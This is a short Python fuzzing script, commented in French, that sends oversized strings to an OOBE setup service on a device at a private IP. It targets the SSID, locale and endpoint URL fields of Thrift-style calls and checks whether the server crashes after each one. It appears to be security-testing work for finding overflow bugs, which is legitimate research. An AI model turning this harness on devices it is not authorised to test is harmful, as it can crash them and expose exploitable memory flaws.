#!/usr/bin/env python3
"""Batterie de tests de debordement sur tous les champs chaine de l'OOBE."""
import json, socket, sys, time, urllib.request
DEV = sys.argv[1] if len(sys.argv)>1 else "10.201.126.241"

def alive(t=3):
    try:
        s=socket.create_connection((DEV,8080),timeout=t); s.close(); return True
    except: return False

def post(payload, tmo=12):
    try:
        r=urllib.request.Request(f"http://{DEV}:8080/OOBE",
            data=json.dumps(payload,separators=(",",":")).encode(),
            headers={"Content-Type":"application/x-thrift"})
        return urllib.request.urlopen(r,timeout=tmo).status
    except urllib.error.HTTPError as e: return f"HTTP{e.code}"
    except Exception as e: return type(e).__name__

def tel(method, args=None):
    p=[1,method,1,1,args or {}]
    return post(p)

def test(name, method, builder, sizes):
    print(f"\n=== {name} ===")
    for n in sizes:
        body = builder(n)
        st = tel(method, body)
        ok = alive()
        print(f"  len={n:6} -> {st!s:18} alive={ok}")
        if not ok:
            print(f"  ★★★ SERVEUR MORT sur {name} len={n}")
            return False
        time.sleep(0.4)
    return True

def mk_ssid(n):
    return {"1":{"rec":{"1":{"str":"A"*n},"2":{"i32":3},"3":{"rec":{"1":{"str":"x"}}}}}}

def mk_locales(n):
    return {"7":{"lst":["str",1,"A"*n]}}

def mk_endpoint(n):
    return {"1":{"str":"http://"+"B"*n}}

SIZES=[32,256,1024,4096,16384,65536]

if not alive():
    print("serveur injoignable"); sys.exit(1)
print("baseline OK")
if test("connectToAP / SSID", "connectToAP", mk_ssid, SIZES): pass
if not alive(): sys.exit(0)
if test("setLocaleAndEndpoints / locale", "setLocaleAndEndpoints", mk_locales, SIZES): pass
if not alive(): sys.exit(0)
test("endpoint URL", "setLocaleAndEndpoints", mk_endpoint, SIZES)
print("\nfini. serveur vivant:", alive())
